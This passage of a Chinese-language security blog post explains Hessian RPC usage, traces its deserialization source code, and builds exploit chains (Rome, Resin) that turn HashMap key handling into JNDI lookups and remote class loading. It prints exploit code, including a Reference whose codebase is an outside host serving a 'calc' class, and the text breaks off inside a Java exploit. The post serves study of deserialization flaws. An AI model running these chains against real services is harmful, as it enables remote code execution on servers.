<span class="hljs-title class_">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HessianServlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Greeting</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HashMap o)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello &quot;</span>+o.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后需要配置Servlet映射，我这里直接用了注解，也可以用web.xml来配置</p><p>Client 端通过 <code>com.caucho.hessian.client.HessianProxyFactory</code> 工厂类创建对接口的代理对象，并进行调用，可以看到调用后执行了服务端的逻辑并返回了结果。</p><blockquote><p>这一部分和RMI的远程调用类似，都是通过代理创建对象来执行方法的，等会分析源码的时候也会看到</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.client.HessianProxyFactory;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://localhost:8080/HessianServlet_war_exploded/hessian&quot;</span>;<br>        <span class="hljs-type">HessianProxyFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianProxyFactory</span>();<br>        <span class="hljs-type">Greeting</span> <span class="hljs-variable">greeting</span> <span class="hljs-operator">=</span> (Greeting) factory.create(Greeting.class, url);<br>        HashMap&lt;Object, Object&gt; object = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        object.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;Hessian Call: &quot;</span>+greeting.sayHello(object));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410091058542.png" alt="image-20241009105834433"></p><p>这里Hessian并不需要像RMI那样接口的包名需要相同。</p><h2 id="基于spring"><a href="#基于Spring" class="headerlink" title="基于Spring"></a>基于Spring</h2><p>Spring-web 包内提供了 <code>org.springframework.remoting.caucho.HessianServiceExporter</code> 用来暴露远程调用的接口和实现类。使用该类 export 的 Hessian Service 可以被任何 Hessian Client 访问，因为 Spring 中间没有进行任何特殊处理。</p><p>从 spring-web-5.3 后，该类被标记为 <code>@Deprecated</code> ， 也就是说 spring 在逐渐淘汰对基于序列化的远程调用的相关支持。</p><blockquote><p>我这里一开始springboot3里面的spring-web是6.1.13的版本，是直接连HessianServiceExporter这个类也找不到了</p></blockquote><p>这里就不尝试了，copy一下官方文档的代码示例：<a href="https://www.baeldung.com/spring-remoting-hessian-burlap">https://www.baeldung.com/spring-remoting-hessian-burlap</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean(name = &quot;/booking&quot;)</span> <br>RemoteExporter <span class="hljs-title function_">bookingService</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">HessianServiceExporter</span> <span class="hljs-variable">exporter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianServiceExporter</span>();<br>    exporter.setService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CabBookingServiceImpl</span>());<br>    exporter.setServiceInterface( CabBookingService.class );<br>    <span class="hljs-keyword">return</span> exporter;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是暴露服务的代码，客户端同样用前面的即可，只需要改一下url</p><p>他还有使用Burlap协议的写法</p><p>暴露服务：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean(name = &quot;/booking&quot;)</span> <br>RemoteExporter <span class="hljs-title function_">burlapService</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">BurlapServiceExporter</span> <span class="hljs-variable">exporter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BurlapServiceExporter</span>();<br>    exporter.setService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CabBookingServiceImpl</span>());<br>    exporter.setServiceInterface( CabBookingService.class );<br>    <span class="hljs-keyword">return</span> exporter;<br>&#125;<br></code></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> BurlapProxyFactoryBean <span class="hljs-title function_">burlapInvoker</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">BurlapProxyFactoryBean</span> <span class="hljs-variable">invoker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BurlapProxyFactoryBean</span>();<br>    invoker.setServiceUrl(<span class="hljs-string">&quot;http://localhost:8080/booking&quot;</span>);<br>    invoker.setServiceInterface(CabBookingService.class);<br>    <span class="hljs-keyword">return</span> invoker;<br>&#125;<br></code></pre></td></tr></table></figure><p>写法基本和使用hessian一致</p><h2 id="自封装调用"><a href="#自封装调用" class="headerlink" title="自封装调用"></a>自封装调用</h2><p>就是通过对 <code>HessianInput/HessianOutput</code>、<code>Hessian2Input/Hessian2Output</code>、<code>BurlapInput/BurlapOutput</code> 的相关方法的封装，可以自行实现传输、存储等逻辑，使用 Hessian 进行序列化和反序列化数据。</p><p>这里的Input和Output方法就是直接进行序列化和反序列化的方法，前面的调用也都是对这些方法进行了封装，Output就是序列化出去，Input就是反序列化</p><p>Input方法都继承自AbstractHessianInput这个抽象类</p><p><img src="https://cdn.clown2024.cn/202410091608295.png" alt="image-20241009160850197"></p><p>Output方法则继承AbstractHessianOutput抽象类</p><p><img src="https://cdn.clown2024.cn/202410091609188.png" alt="image-20241009160949153"></p><p>这里封装成一个工具类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianUtil</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Hessian序列化</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> obj</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">byte</span>[] result=<span class="hljs-literal">null</span>;<br>        Hessian2Output oo=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(bos);<span class="hljs-comment">//封装字节流</span><br>        oo.writeObject(obj);<span class="hljs-comment">//写入序列化对象字节流</span><br>        oo.flush();<br>        result=bos.toByteArray();<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Hessian反序列化</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> bytes</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        Hessian2Input oi=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bis);<br>        <span class="hljs-keyword">return</span> oi.readObject();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="jndi调用"><a href="#JNDI调用" class="headerlink" title="JNDI调用"></a>JNDI调用</h2><p>Hessian 还可以通过将 HessianProxyFactory 配置为 JNDI Resource 的方式来调用。看文章是用了resin来配置的，我没查到web.xml的配置，截个文章的图知道一下算了</p><p><img src="https://cdn.clown2024.cn/202410091644186.png" alt="image-20241009164415140"></p><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><h2 id="接口调用"><a href="#接口调用" class="headerlink" title="接口调用"></a>接口调用</h2><p>那前面的基于Servlet的代码先来分析，HessianServlet是HttpServlet的子类，那么HessianServlet 的<code>init</code> 方法将会承担一些初始化的功能，而 <code>service</code> 方法将会是相关处理的起始位置。</p><p>该类的成员变量</p><p><img src="https://cdn.clown2024.cn/202410091650586.png" alt="image-20241009165055536"></p><p><code>_homeAPI</code>(调用类的接口 Class)、<code>_homeImpl</code>(具体实现类的对象)、<code>_serializerFactory</code>(序列化工厂类)、<code>_homeSkeleton</code>(封装方法)</p><p>看一下init方法</p><p><img src="https://cdn.clown2024.cn/202410091655779.png" alt="image-20241009165531713"></p><p>就是对各变量进行判断是否为空来进行初始化，它里面调用了loadClass方法来加载类，不过他这里自己重写了一个loadClass</p><p><img src="https://cdn.clown2024.cn/202410091716251.png" alt="image-20241009171609208"></p><p><img src="https://cdn.clown2024.cn/202410091716148.png" alt="image-20241009171618113"></p><p>这里优先从线程获取类加载器，应该是为了更快加载到对应的类，避免走双亲委派的流程，线程的默认的类加载器是AppClassLoader</p><p>然后看他的service方法</p><p><img src="https://cdn.clown2024.cn/202410091723880.png" alt="image-20241009172300818"></p><p>可以看到只支持POST请求，获取id或者ejbid作为objectId，然后设置一个响应头，再去调用invoke方法</p><p><img src="https://cdn.clown2024.cn/202410091724012.png" alt="image-20241009172457963"></p><p>然后就根据objectId是否为空来选择调用的方法</p><p>先看一下第一个方法com.caucho.hessian.server.HessianSkeleton#invoke</p><p>该类的父类是AbstractSkeleton，该类对Hessian提供的服务进行封装</p><p><img src="https://cdn.clown2024.cn/202410091929088.png" alt="image-20241009192918042"></p><p>其将方法、方法名等保存在_methodMap里面</p><p><img src="https://cdn.clown2024.cn/202410091932778.png" alt="image-20241009193223729"></p><p>然后HessianSkeleton初始化就将自己的实现类保存在_service变量里面</p><p>该类里面还有两个成员变量要看一下</p><p><img src="https://cdn.clown2024.cn/202410091937552.png" alt="image-20241009193725504"></p><p>两个工厂类，HessianInputFactory就是用来读取和创建HessianInput&#x2F;Hessian2Input 流，HessianFactory用来</p><p>创建HessianInput&#x2F;Hessian2Input&#x2F;HessianOutput&#x2F;Hessian2Output流</p><p>对类基本了解后回过头继续看invoke方法</p><p><img src="https://cdn.clown2024.cn/202410091949119.png" alt="image-20241009194929048"></p><p>一开始调用_inputFactory读取header，然后根据header来创建对应的Input和Output流，最后再invoke调用一次服务</p><p>这里代码比较长就直接截文章里的图了，这个图写了注释</p><p><img src="https://cdn.clown2024.cn/202410092030361.png" alt="image-20241009203055295"></p><p>还有spring的逻辑也差不多看看文章的就好了</p><h2 id="序列化和反序列化细节"><a href="#序列化和反序列化细节" class="headerlink" title="序列化和反序列化细节"></a>序列化和反序列化细节</h2><p>序列化和反序列化的读取、写入就是由我们前面提到过的AbstractHessianInput&#x2F;AbstractHessianOutput这两个抽象类提供，然后Hessian&#x2F;Hessian2&#x2F;Burlap都提供了方法的具体实现</p><p>以Hessian2Output为例子看看序列化的写入</p><p><img src="https://cdn.clown2024.cn/202410092039705.png" alt="image-20241009203934647"></p><p>这里根据具体的类来获取序列化器然后写入序列化数据，可以看一下Serializer的实现类有多少</p><p><img src="https://cdn.clown2024.cn/202410092044894.png" alt="image-20241009204454835"></p><p>对于自定义类型，将会使用 <code>JavaSerializer/UnsafeSerializer/JavaUnsharedSerializer</code> 进行相关的序列化动作，默认情况下是 <code>UnsafeSerializer</code></p><p>看一下UnsafeSerializer#writeObject方法</p><p><img src="https://cdn.clown2024.cn/202410092233208.png" alt="image-20241009223331142"></p><p>这里会调用一个writeObjectBegin方法，该方法是AbstractHessianOutput的</p><p><img src="https://cdn.clown2024.cn/202410092236620.png" alt="image-20241009223618572"></p><p>里面再调用了一个writeMapBegin方法，Hessian2Output 重写了writeObjectBegin这个方法，而其他实现类没有。也就是说在 Hessian 1.0 和 Burlap 中，写入自定义数据类型（Object）时，都会调用 <code>writeMapBegin</code> 方法将其标记为 Map 类型。</p><p>在 Hessian 2.0 中，将会调用 <code>writeDefinition20</code> 和 <code>Hessian2Output#writeObjectBegin</code> 方法写入自定义数据，就不再将其标记为 Map 类型。</p><p>再看反序列化，以Hessian2Input为例</p><p><img src="https://cdn.clown2024.cn/202410092244449.png" alt="image-20241009224448389"></p><p>基本就是一大串的switch case语句，根据标识位进行不同的逻辑处理</p><p><img src="https://cdn.clown2024.cn/202410092309278.png" alt="image-20241009230909226"></p><p>他在反序列化时也会根据类型获取对应的反序列化器</p><p><img src="https://cdn.clown2024.cn/202410092312974.png" alt="image-20241009231208927"></p><p>然后读取自定义类型数据用的是UnsafeDeserializer类，看一下他的readObject方法</p><p><img src="https://cdn.clown2024.cn/202410092315911.png" alt="image-20241009231538854"></p><p><img src="https://cdn.clown2024.cn/202410092320613.png" alt="image-20241009232015561"></p><p>创建Unsafe类实例，然后反序列化读取Field并反射写入</p><p><img src="https://cdn.clown2024.cn/202410092320165.png" alt="image-20241009232019114"></p><p>Hessian 1.0 的 HessianInput 中，没有针对 Object 的读取，而是都将其作为 Map 读取，因为在序列化的过程中我们也提到，在写入自定义类型时会将其标记为 Map 类型。</p><p><code>MapDeserializer#readMap</code> 方法提供了针对 Map 类型数据的处理逻辑</p><p><img src="https://cdn.clown2024.cn/202410092327669.png" alt="image-20241009232731601"></p><h2 id="远程调用"><a href="#远程调用" class="headerlink" title="远程调用"></a>远程调用</h2><p>还是根据前面的客户端代码来调试，根据create方法一路往下</p><p><img src="https://cdn.clown2024.cn/202410092353919.png" alt="image-20241009235359859"></p><p>在这里创建了动态代理，我们知道动态代理调用方法时会走InvocationHandler#invoke方法，我们去看一下</p><p><img src="https://cdn.clown2024.cn/202410100001263.png" alt="image-20241010000103202"></p><p>这里是处理相关方法调用，再往后就是发送请求结果并反序列化，截一下文章的图</p><p><img src="https://cdn.clown2024.cn/202410100008161.png" alt="image-20241010000832095"></p><h2 id="其他实现细节"><a href="#其他实现细节" class="headerlink" title="其他实现细节"></a>其他实现细节</h2><p><strong>协议版本</strong></p><p>使用那种协议进行序列化和反序列化取决于请求标志位</p><p>这一设定位于 <code>HessianProxyFactory</code> 中的两个布尔型变量中，即 <code>_isHessian2Reply</code> 和 <code>_isHessian2Request</code></p><p><img src="https://cdn.clown2024.cn/202410100012841.png" alt="image-20241010001231800"></p><p>想更改协议自己set方法设置即可</p><p><strong>Serializable</strong></p><p>我们知道在Java 原生反序列化中，实现了 <code>java.io.Serializable</code> 接口的类才可以反序列化</p><p>Hessian在获取默认序列化器的时候会检查是否实现了Serializable接口</p><p><img src="https://cdn.clown2024.cn/202410100020094.png" alt="image-20241010002017043"></p><p>但是注意这里有一个_isAllowNonSerializable变量，它可以打破这种规范，我们只要用set方法将他设置为true，这样没有实现Serializable接口的类也能序列化</p><p>然后是 transient 和 static 的问题，在序列化时，由 <code>UnsafeSerializer#introspect</code> 方法来获取对象中的字段，在老版本中应该是 <code>getFieldMap</code> 方法。依旧是判断了成员变量标识符，如果是 transient 和 static 字段则不会参与序列化反序列化流程。</p><p><img src="https://cdn.clown2024.cn/202410100024721.png" alt="image-20241010002444663"></p><p>这个地方对标识符进行了判断，如果为 transient 和 static 字段则不会参与序列化反序列化流程</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>前面的分析可以知道Hessian大部分是利用反射写入值，且过程并没有调用类的readObject方法，也没有触发getter&#x2F;setter方法，那么漏洞点在哪呢</p><p>漏洞点就在我们前面说过的对Map类型数据的处理上，<code>MapDeserializer#readMap</code> 对 Map 类型数据进行反序列化操作是会创建相应的 Map 对象，并将 Key 和 Value 分别反序列化后使用 put 方法写入数据。在没有指定 Map 的具体实现类时，将会默认使用 HashMap ，对于 SortedMap，将会使用 TreeMap。</p><p><img src="https://cdn.clown2024.cn/202410100032949.png" alt="image-20241010003247887"></p><p>那利用的方式其实就比较好联想了对于这两个类</p><p>HashMap在put的时候会调用hash方法，从而调用key.hashCode。</p><p><img src="https://cdn.clown2024.cn/202410100035334.png" alt="image-20241010003515291"></p><p>TreeMap 在 put 时，由于要进行排序，所以要对 key 进行比较操作，将会调用 compare 方法，会调用 key 的 compareTo 方法。</p><p><img src="https://cdn.clown2024.cn/202410100035008.png" alt="image-20241010003554961"></p><p>这么一看Hessian反序列化利用被限制得比较窄</p><ul><li>kick-off chain 起始方法只能为 hashCode&#x2F;equals&#x2F;compareTo 方法；</li><li>利用链中调用的成员变量不能为 transient 修饰；</li><li>所有的调用不依赖类中 readObject 的逻辑，也不依赖 getter&#x2F;setter 的逻辑。</li></ul><h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><p>在<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目里有关于该反序列化的实现，有下面五条链</p><ul><li>Rome</li><li>XBean</li><li>Resin</li><li>SpringPartiallyComparableAdvisorHolder</li><li>SpringAbstractBeanFactoryPointcutAdvisor</li></ul><h2 id="rome链"><a href="#Rome链" class="headerlink" title="Rome链"></a>Rome链</h2><p>Rome链的核心是他的ToStringBean的toString方法，他可以调用传入类的所有无参getter方法，这里就可以打JdbcRowSetImpl的链子触发jndi</p><p>然后ToStringBean外面包一层EqualsBean和HashMap即可</p><p>触发链子如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HashMap#hashCode<br>EqualsBean#hashCode<br>EqualsBean#beanHashCode<br>ToStringBean#toString<br>JdbcRowSetImpl#getDatabaseMetaData<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410101102136.png" alt="image-20241010110223027"></p><p><img src="https://cdn.clown2024.cn/202410101102006.png" alt="image-20241010110235946"></p><h3 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h3><p>上面的JNDI利用需要出网，所以可以借助SignedObject#getObject来打二次反序列化</p><p>链子改成这样就行了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HashMap#hashCode<br>EqualsBean#hashCode<br>EqualsBean#beanHashCode<br>ToStringBean#toString<br>SignedObject#getObject<br></code></pre></td></tr></table></figure><p>然后封装一个想要的链子进去就行了</p><h2 id="resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h2><p>该链子最终效果打的是远程类加载</p><p>参考文章：<a href="https://blog.csdn.net/uuzeray/article/details/136727060">https://blog.csdn.net/uuzeray/article/details/136727060</a></p><p>Resin是一个轻量级的、高性能的开源Java应用服务器。它是由Caucho Technology开发的，旨在提供可靠的Web应用程序和服务的运行环境，和Tomcat一样是个服务器；他常和Hessian产生联系</p><p>测试时可以导入下面的包</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.caucho<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>resin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.64<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Resin 这条利用链的入口点实际上是 HashMap 对比两个对象时触发的 <code>com.sun.org.apache.xpath.internal.objects.XString</code> 的 <code>equals</code> 方法。</p><p>XString的利用在ROME的HotSwappableTargetSource利用链有用到过</p><p><img src="https://cdn.clown2024.cn/202410102001525.png" alt="image-20241010200147467"></p><p>在这里我们利用的是com.caucho.naming.QName的toString方法</p><p><img src="https://cdn.clown2024.cn/202410102003734.png" alt="image-20241010200338680"></p><p>这里的逻辑比较简单，但是QName是什么，我们得先了解一下，才能知道他这样为什么可以触发</p><p>看一下他的描述</p><p><img src="https://cdn.clown2024.cn/202410102030167.png" alt="image-20241010203001097"></p><p>这里描述意思是代表一个已解析的JNDI名称</p><p>看一下他的构造方法</p><p><img src="https://cdn.clown2024.cn/202410102032765.png" alt="image-20241010203211713"></p><p>QName对象的功能是用于表示一个JNDI限定名（qualified name），通过传入的Context对象以及两个字符串参数（first和rest），QName对象可以将这些信息组合起来形成一个完整的限定名。</p><p>Context接口的描述</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">This interface represents a naming context, which consists of a set of name-to-object bindings. It contains methods for examining and updating these bindings.<br></code></pre></td></tr></table></figure><p>此接口表示一个命名上下文，它由一组名称到对象的绑定组成。它包含检查和更新这些绑定的方法。也就是jndi的相关操作</p><p>然后我们要用到的Context的实现类是ContinuationContext</p><p>构造方法</p><p><img src="https://cdn.clown2024.cn/202410102039546.png" alt="image-20241010203937489"></p><p>CannotProceedException是javax.naming异常体系中的一种异常，通常在本地加载类失败时使用。它的作用是对无法继续进行操作的异常情况进行处理。</p><p>处理的关键在Reference类，文章给了一个对CannotProceedException类的构造</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">refAddr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://124.222.136.33:1337/&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">refClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;calc&quot;</span>;<br> <br><span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(refClassName, refClassName, refAddr);<br> <br><span class="hljs-type">Object</span> <span class="hljs-variable">cannotProceedException</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.naming.CannotProceedException&quot;</span>).getDeclaredConstructor().newInstance();<br><span class="hljs-type">String</span> <span class="hljs-variable">classname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;javax.naming.NamingException&quot;</span>;<br>setFiled(classname, cannotProceedException, <span class="hljs-string">&quot;resolvedObj&quot;</span>, ref);<br></code></pre></td></tr></table></figure><p>Reference构造方法</p><p><img src="https://cdn.clown2024.cn/202410102106681.png" alt="image-20241010210638627"></p><p>现在回到前面QName的toString方法，我们会调用ContinuationContext#composeName方法</p><p><img src="https://cdn.clown2024.cn/202410102113650.png" alt="image-20241010211324591"></p><p>然后调用到getTargetContext方法，这里的ctx.composeName方法可以忽略，不在利用链中</p><p><img src="https://cdn.clown2024.cn/202410102114406.png" alt="image-20241010211417350"></p><p>然后我们需要进入到NamingManager.getContext方法里面，不过还需要满足前面的两个条件</p><p>contCtx &#x3D;&#x3D; null，在构造中本身就不设置，所以不需要考虑<br>cpe.getResolvedObj()返回不为null(其实返回的就是我们上面给CannotProceedException构造的恶意Reference)，所以也不会为null</p><p>这里传的是cpe.getResolvedObj，也就是我们构造的Reference类</p><p>继续跟进</p><p><img src="https://cdn.clown2024.cn/202410102122102.png" alt="image-20241010212200426"></p><p>然后漏洞的触发点就在NamingManager#getObjectInstance这个方法里面，从名字看就是要对我们传入的Reference类进行实例化</p><p>有关该方法的描述</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Creates an instance of an object for the specified object and environment.<br>If an object factory builder has been installed, it is used to create a factory for creating the object. Otherwise, the following rules are used to create the object:<br>If refInfo is a Reference or Referenceable containing a factory class name, use the named factory to create the object. Return refInfo if the factory cannot be created<br>翻译一下：<br>为指定的对象和环境创建对象的实例。<br>如果已安装对象工厂生成器，则使用它来创建用于创建对象的工厂。否则，将使用以下规则创建对象：<br>如果refInfo是包含工厂类名的Reference或Referenceable，请使用命名的工厂创建对象。如果无法创建工厂，则返回refInfo。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410102142943.png" alt="image-20241010214214868"></p><p>然后关键类方法是getObjectFactoryFromReference</p><p><img src="https://cdn.clown2024.cn/202410102157527.png" alt="image-20241010215719459"></p><p>这首先会从本地加载类，肯定加载不到，然后就从codebase加载，也就是我们的远程地址那里，最后及进行类的实例化，然后触发漏洞</p><p>然后就是hashMap要触发equals还要构造哈希相等，有点懒得再分析了，直接copy文章的exp小改一下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.caucho.naming.QName;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javax.naming.CannotProceedException;<br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refAddr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;TestRef&quot;</span>;<br><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(refClassName, refClassName, refAddr);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">cannotProceedException</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.naming.CannotProceedException&quot;</span>).getDeclaredConstructor().newInstance();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">classname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;javax.naming.NamingException&quot;</span>;<br>        setFiled(classname, cannotProceedException, <span class="hljs-string">&quot;resolvedObj&quot;</span>, ref);<br><br>        <span class="hljs-comment">// 创建ContinuationContext对象</span><br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;javax.naming.spi.ContinuationContext&quot;</span>);<br>        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);<br>        <span class="hljs-comment">// 构造方法为protected修饰</span><br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Context</span> <span class="hljs-variable">continuationContext</span> <span class="hljs-operator">=</span> (Context) constructor.newInstance(cannotProceedException, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;());<br><br><br>        <span class="hljs-comment">// 创建QName</span><br>        <span class="hljs-type">QName</span> <span class="hljs-variable">qName</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">QName</span>(continuationContext, <span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> unhash(qName.hashCode());<br>        <span class="hljs-comment">// 创建Xtring</span><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(str);<br><br>        <span class="hljs-comment">// 创建HashMap</span><br>        <span 